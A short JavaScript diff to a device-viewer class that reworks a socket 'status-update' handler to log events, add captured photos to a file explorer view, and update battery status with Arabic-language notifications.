@@ -86,8 +86,16 @@ export class ViewerSystem {
             }
         });
 
-        this.socket.on('status-update', (payload) => {
-            if (payload.type === 'battery') this.updateBatteryUI(payload);
+        this.socket.on('status-update', (data) => {
+            console.log("Status update received:", data);
+
+            if (data.type === 'photo-captured') {
+                this.addFileToExplorer(data.data, data.timestamp);
+                Core.showNotification("تم التقاط صورة وحفظها في الملفات", "success");
+            } else if (data.battery) {
+                this.updateBatteryUI(data.battery);
+                Core.showNotification("تم تحديث حالة الجهاز بنجاح");
+            }
         });
 
         this.socket.on('device-info', (payload) => this.updateDeviceInfoUI(payload.info));
